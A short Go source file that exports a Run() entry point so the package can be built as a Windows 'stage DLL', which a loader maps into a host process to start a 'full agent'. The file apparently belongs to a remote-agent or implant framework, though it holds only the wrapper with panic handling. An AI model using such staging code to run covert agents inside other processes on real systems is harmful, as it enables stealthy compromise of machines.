//go:build windows && cgo

package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
	"os"
	"runtime"
)

// Run is the exported entry point used when this package is compiled as a
// shared library (stage DLL). A loader maps the DLL and calls Run() to start
// the full agent inside the host process.
//
//export Run
func Run() {
	defer func() {
		if r := recover(); r != nil {
			buf := make([]byte, 1<<16)
			n := runtime.Stack(buf, true)
			fmt.Fprintf(os.Stderr, "[agent] PANIC in Run: %v\n%s\n", r, buf[:n])
		}
	}()
	_ = agentMain(false)
}
